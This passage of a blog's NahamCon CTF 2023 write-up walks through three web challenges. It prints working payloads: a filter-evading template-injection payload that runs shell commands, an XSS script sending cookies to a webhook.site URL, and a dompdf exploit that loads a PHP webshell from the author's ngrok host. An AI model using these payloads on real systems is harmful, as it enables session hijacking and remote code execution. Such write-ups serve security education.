<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:54 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:54 ..
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> uwsgi    uwsgi         <span class="m">4096</span> Jun <span class="m">16</span> 20:55 DB
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">159</span> Jun <span class="m">14</span> 17:53 app.ini
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root     root          <span class="m">6693</span> Jun <span class="m">14</span> 17:53 app.py
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">792</span> Jun <span class="m">14</span> 17:53 models.py
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> root     root           <span class="m">138</span> Jun <span class="m">14</span> 17:53 requirements.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:53 templates
</span></span></code></pre></td></tr></table>
</div>
</div><p>I notice the DB folder, and I recall that my task id&rsquo;s started at 2. Perhaps the flag is in admin&rsquo;s task list, for id number 1?</p>
<p>Looking inside the DB folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
</span></span><span class="line"><span class="cl">-rw-r--r--    1 uwsgi    uwsgi        16384 Jun 16 20:55 db.sqlite
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select <code>db.sqlite</code> without using dot. When I try <code>cat /usr/src/app/DB/*</code>:</p>
<p><img src="/p/nahamconctf_2023/images/20230616172048.png"
	width="1265"
	height="85"
	srcset="/p/nahamconctf_2023/images/20230616172048_hu7177675040539749091.png 480w, /p/nahamconctf_2023/images/20230616172048_hu7133356982165736633.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616172048.png"
	
	
		class="gallery-image" 
		data-flex-grow="1488"
		data-flex-basis="3571px"
	
></p>
<p>It seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try <code>strings</code>, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.</p>
<p>Request:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tabletasktask
</span></span><span class="line"><span class="cl">CREATE TABLE task <span class="o">(</span>
</span></span><span class="line"><span class="cl">	id INTEGER NOT NULL, 
</span></span><span class="line"><span class="cl">	name VARCHAR<span class="o">(</span>100<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	completed BOOLEAN, 
</span></span><span class="line"><span class="cl">	user_id INTEGER, 
</span></span><span class="line"><span class="cl">	PRIMARY KEY <span class="o">(</span>id<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	CHECK <span class="o">(</span>completed IN <span class="o">(</span>0, 1<span class="o">))</span>, 
</span></span><span class="line"><span class="cl">	FOREIGN KEY<span class="o">(</span>user_id<span class="o">)</span> REFERENCES user <span class="o">(</span>id<span class="o">)</span>
</span></span><span class="line"><span class="cl">tableuseruser
</span></span><span class="line"><span class="cl">CREATE TABLE user <span class="o">(</span>
</span></span><span class="line"><span class="cl">	id INTEGER NOT NULL, 
</span></span><span class="line"><span class="cl">	username VARCHAR<span class="o">(</span>40<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	password VARCHAR<span class="o">(</span>50<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	PRIMARY KEY <span class="o">(</span>id<span class="o">)</span>, 
</span></span><span class="line"><span class="cl">	UNIQUE <span class="o">(</span>username<span class="o">)</span>
</span></span><span class="line"><span class="cl">indexsqlite_autoindex_user_1user
</span></span><span class="line"><span class="cl">asdfasdf
</span></span><span class="line"><span class="cl">-adminT2dUL6Z#S9KH%x%i
</span></span><span class="line"><span class="cl">asdf
</span></span><span class="line"><span class="cl">	admin
</span></span><span class="line"><span class="cl">asdf
</span></span><span class="line"><span class="cl">	flag<span class="o">{</span>7b5b91c60796488148ddf3b227735979<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Very foturnately, the flag not only survived but is very readable!
<code>flag{7b5b91c60796488148ddf3b227735979}</code></p>
<p>As a side note, we have the password for <code>admin</code> now too, and can log in.
<code>admin:T2dUL6Z#S9KH%x%i</code></p>
<p><img src="/p/nahamconctf_2023/images/20230616172852.png"
	width="1121"
	height="372"
	srcset="/p/nahamconctf_2023/images/20230616172852_hu9295678517331716289.png 480w, /p/nahamconctf_2023/images/20230616172852_hu3810270833212618813.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616172852.png"
	
	
		class="gallery-image" 
		data-flex-grow="301"
		data-flex-basis="723px"
	
></p>
<h3 id="star-wars">Star Wars
</h3><blockquote>
<p>Author: @congon4tor#2334</p>
<p>If you love Star Wars as much as I do you need to check out this blog!</p>
</blockquote>
<hr>
<p>Firstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username <code>asdf</code>. Upon entering we are led to a blog post:</p>
<p><img src="/p/nahamconctf_2023/images/20230615231203.png"
	width="1218"
	height="712"
	srcset="/p/nahamconctf_2023/images/20230615231203_hu2016050719957999891.png 480w, /p/nahamconctf_2023/images/20230615231203_hu14765815825195728369.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615231203.png"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="410px"
	
></p>
<p>We see a comment section and not much else, so of course we have to check for XSS</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nahamconctf_2023/images/20230615231619.png"
	width="1113"
	height="456"
	srcset="/p/nahamconctf_2023/images/20230615231619_hu13536866873016769211.png 480w, /p/nahamconctf_2023/images/20230615231619_hu16673593163855891616.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615231619.png"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="585px"
	
></p>
<p>Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use webhook.site to receive the cookie request.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;
</span></span><span class="line"><span class="cl">document.write(``&#39;&lt;img src=&#34;https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c=&#39;``+document.cookie+``&#39;&#34; /&gt;&#39;``);
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>This XSS generates an image pointing to my webhook.site link, and adds the user&rsquo;s <code>document.cookie</code> to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim&rsquo;s session.</p>
<p><img src="/p/nahamconctf_2023/images/20230615230950.png"
	width="1102"
	height="428"
	srcset="/p/nahamconctf_2023/images/20230615230950_hu8664303040376913390.png 480w, /p/nahamconctf_2023/images/20230615230950_hu15556859809465727075.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615230950.png"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>Indeed we see a cookie: <code>x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0</code></p>
<p>By substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting <code>/admin</code>. This is pretty guessable, although I do concede to running <code>feroxbuster</code> to point it out to me:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">feroxbuster -u http://challenge.nahamcon.com:30413/
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl"><span class="m">02</span>      GET        4l       28w      303c http://challenge.nahamcon.com:30413/admin
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>When visiting /admin while having the token, we can find the flag.</p>
<p><img src="/p/nahamconctf_2023/images/20230615230911.png"
	width="1134"
	height="211"
	srcset="/p/nahamconctf_2023/images/20230615230911_hu11059865186760526650.png 480w, /p/nahamconctf_2023/images/20230615230911_hu1266101176135921621.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615230911.png"
	
	
		class="gallery-image" 
		data-flex-grow="537"
		data-flex-basis="1289px"
	
></p>
<p><code>flag{a538c88890d45a382e44dfd00296a99b}</code></p>
<h3 id="stickers">Stickers
</h3><blockquote>
<p>Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
<strong>Find the flag file in <code>/flag.txt</code> at the root of the filesystem.</strong></p>
</blockquote>
<hr>
<p>Visiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:</p>
<p><img src="/p/nahamconctf_2023/images/20230616151436.png"
	width="632"
	height="606"
	srcset="/p/nahamconctf_2023/images/20230616151436_hu6134942456412677867.png 480w, /p/nahamconctf_2023/images/20230616151436_hu14060364282115699684.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616151436.png"
	
	
		class="gallery-image" 
		data-flex-grow="104"
		data-flex-basis="250px"
	
></p>
<p>In particular I notice the url of the page corresponds to the data I submitted:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://challenge.nahamcon.com:31182/quote.php?organisation=&amp;email=&amp;small=0&amp;medium=0&amp;large=0
</span></span></code></pre></td></tr></table>
</div>
</div><p>I downloaded the pdf file and decided to see if I can glean some information on how it was generated:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">exiftool</span> <span class="n">quote</span><span class="o">.</span><span class="n">pdf</span> 
</span></span><span class="line"><span class="cl"><span class="n">ExifTool</span> <span class="n">Version</span> <span class="n">Number</span>         <span class="p">:</span> <span class="mf">12.57</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">quote</span><span class="o">.</span><span class="n">pdf</span>
</span></span><span class="line"><span class="cl"><span class="ne">Directory</span>                       <span class="p">:</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Size</span>                       <span class="p">:</span> <span class="mf">2.5</span> <span class="n">kB</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Modification</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">16</span> <span class="mi">15</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">27</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Access</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>           <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">16</span> <span class="mi">15</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">27</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Inode</span> <span class="n">Change</span> <span class="n">Date</span><span class="o">/</span><span class="n">Time</span>     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">16</span> <span class="mi">15</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">27</span><span class="o">-</span><span class="mi">04</span><span class="p">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Permissions</span>                <span class="p">:</span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">PDF</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Type</span> <span class="n">Extension</span>             <span class="p">:</span> <span class="n">pdf</span>
</span></span><span class="line"><span class="cl"><span class="n">MIME</span> <span class="n">Type</span>                       <span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">pdf</span>
</span></span><span class="line"><span class="cl"><span class="n">PDF</span> <span class="n">Version</span>                     <span class="p">:</span> <span class="mf">1.7</span>
</span></span><span class="line"><span class="cl"><span class="n">Linearized</span>                      <span class="p">:</span> <span class="n">No</span>
</span></span><span class="line"><span class="cl"><span class="n">Page</span> <span class="n">Count</span>                      <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Producer</span>                        <span class="p">:</span> <span class="n">dompdf</span> <span class="mf">1.2</span><span class="o">.</span><span class="mi">0</span> <span class="o">+</span> <span class="n">CPDF</span>
</span></span><span class="line"><span class="cl"><span class="n">Create</span> <span class="n">Date</span>                     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">16</span> <span class="mi">19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl"><span class="n">Modify</span> <span class="n">Date</span>                     <span class="p">:</span> <span class="mi">2023</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">16</span> <span class="mi">19</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
</span></span><span class="line"><span class="cl"><span class="n">Title</span>                           <span class="p">:</span> <span class="n">Quote</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Immediately the producer <code>dompdf</code> stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-28368"  target="_blank" rel="noopener"
    >CVE-2022-28368</a>.</p>
<p>I used <a class="link" href="https://github.com/positive-security/dompdf-rce"  target="_blank" rel="noopener"
    >this poc post</a> to exploit this.</p>
<p>Using my own <code>ngrok</code> website, I direct the payload toward myself, where it can pick up the malicious php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">challenge.nahamcon.com:31182/quote.php?organisation=&lt;link rel=stylesheet href=&#39;https://91cf-50-81-86-237.ngrok-free.app/exploit.css&#39;&gt;&amp;email=&amp;small=0&amp;medium=0&amp;large=0
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the exploit_font.php, I used a simple webshell one-liner:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat exploit_font.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÔøΩ dum1ÔøΩcmap
</span></span><span class="line"><span class="cl">           <span class="sb">`</span>ÔøΩ,glyf5scÔøΩÔøΩheadÔøΩQ6ÔøΩ6hheaÔøΩÔøΩ<span class="o">(</span><span class="nv">$hmtxD</span>
</span></span><span class="line"><span class="cl">loca
</span></span><span class="line"><span class="cl">Tmaxp<span class="se">\ </span>nameDÔøΩ<span class="p">|</span>8dum2ÔøΩ
</span></span><span class="line"><span class="cl">                     -ÔøΩÔøΩ-ÔøΩÔøΩÔøΩÔøΩ
</span></span><span class="line"><span class="cl">:83#5:08ÔøΩÔøΩ_&lt;ÔøΩ
</span></span><span class="line"><span class="cl">             @ÔøΩ8ÔøΩ<span class="p">&amp;</span>€Ω
</span></span><span class="line"><span class="cl">:8LÔøΩÔøΩ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">:D
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">6</span>                               s
</span></span><span class="line"><span class="cl">&lt;?php <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])){</span> <span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> system<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span> die<span class="p">;</span> <span class="o">}</span>?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged.</p>
<p>After the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTTP Requests                                                                                                       
</span></span><span class="line"><span class="cl">-------------                                                                                                       
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">GET /exploit_font.php          200 OK                                                                               
</span></span><span class="line"><span class="cl">GET /exploit.css               200 OK 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the <code>md5sum</code> of the download link, in this case my ngrok link:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ echo -ne &#34;https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php&#34; | md5sum
</span></span><span class="line"><span class="cl">88045a0e7631a2540434bb8c27d7d483  -
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we visit the downloaded link under the format <code>/dompdf/lib/fonts/&lt;font-family&gt;_&lt;style&gt;_&lt;md5(url)&gt;.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÔøΩ dum1ÔøΩcmap`ÔøΩ,glyf5scÔøΩÔøΩheadÔøΩQ6ÔøΩ6hheaÔøΩÔøΩ($hmtxD Lloca Tmaxp\ nameDÔøΩ|8dum2ÔøΩ -ÔøΩÔøΩ-ÔøΩÔøΩÔøΩÔøΩ :83#5:08ÔøΩÔøΩ_&lt;ÔøΩ@ÔøΩ8ÔøΩ&amp;€Ω :8LÔøΩÔøΩ :D 6    s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table>
</div>
</div><p>We do indeed see that it works! We were told the flag is located in root of the filesystem:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>flag{a4d52beabcfdeb6ba79fc08709bb5508}</code></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/osint/">OSINT</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/n00bzctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">N00bzCTF_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/huntress-ctf-2024/">
        
        
            <div class="article-image">
                <img src="/p/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Huntress CTF 2024"
                        
                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Huntress CTF 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-cyber-apocalypse-2024/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
                        
                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/1337up-ctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">1337UP CTF</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/uiuctf_2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">UIUCTF_2023</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

